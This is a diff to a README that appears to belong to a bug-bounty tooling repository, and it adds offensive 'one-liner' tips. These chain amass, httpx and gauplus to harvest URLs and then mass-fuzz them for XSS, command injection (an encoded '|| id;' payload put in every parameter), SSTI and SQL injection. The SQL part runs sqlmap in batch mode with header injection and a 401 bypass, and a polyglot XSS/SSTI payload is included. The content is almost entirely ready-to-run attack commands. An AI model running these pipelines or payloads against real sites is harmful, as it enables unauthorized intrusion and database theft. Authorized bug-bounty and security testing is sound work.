@@ -53,15 +53,67 @@ $ ./awesome-bugbounty-builder.sh
 > exiftool -
 > XSRFProbe 
 
+---
+
 
 ### Bug Bounty TIPS and Usage of tools + One Liner TIPS
 
 
-# One liner *RECON* for FUZZ XSS
+# ONE-LINER *RECON* for FUZZ XSS
 
 ```
 $ amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt
 $ cat domain.txt | gauplus -random-agent -t 200 | gf xss | kxss | tee domain2.txt
 ```
 
-# 
+---
+
+
+# FUZZ all SUBDOMAINS with *FUFF* ONE-LINER
+
+```
+$ amass enum -brute -passive -d http://example.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w wordlist.txt -u @/FUZZ -mc 200'
+```
+
+---
+
+
+# COMMAND Injection with *FUFF* ONE-LINER
+
+```
+$ cat subdomains.txt | httpx -silent -status-code | gauplus -random-agent -t 200 | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
+$ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
+// search for ”uid” in burp proxy intercept 
+// You can use the same query for search SSTI in qsreplase add "{{7*7}}" and search on burp for '49'
+```
+
+
+---
+
+
+# SQL Injection Tips
+
+```
+// MASS SQL injection
+$ amass enum -brute -passive -d example.com | httpx -silent -status-code | tee domain.txt
+$ cat domain.txt | gauplus -random-agent -t 200 | gf sqli | tee domain2.txt
+$ sqlmap -m domain2.txt -dbs --batch --random-agent
+// SQL Injection headers:
+$ sqlmap -u "http://redacted.com" --header="X-Forwarded-For: 1*" --dbs --batch --random-agent --threads=10
+// SQL Injection bypass 401
+$ sqlmap -u "http://redacted.com" --dbs --batch --random-agent --forms --ignore-code=401
+```
+
+---
+
+
+# XSS + SQLi + CSTI/SSTI
+
+```
+Payload: '"><svg/onload=prompt(5);>{{7*7}}
+```
+
+
+---
+
+
